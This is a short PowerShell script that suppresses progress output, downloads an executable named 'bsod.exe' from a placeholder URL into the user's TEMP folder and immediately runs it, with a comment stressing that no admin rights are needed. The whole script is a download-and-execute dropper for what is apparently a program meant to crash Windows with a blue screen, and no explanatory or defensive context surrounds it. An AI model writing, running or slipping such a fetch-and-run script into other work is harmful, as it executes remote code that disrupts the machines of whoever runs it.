# does not require admin privileges

$ProgressPreference = 'SilentlyContinue'

# https://gist.github.com/phoenixthrush/87c45b6b9be0bad58343206774d8d331
$url = "https://example.com/bsod.exe"
$path = Join-Path $env:TEMP "bsod.exe"

Invoke-WebRequest -Uri $url -OutFile $path
Start-Process $path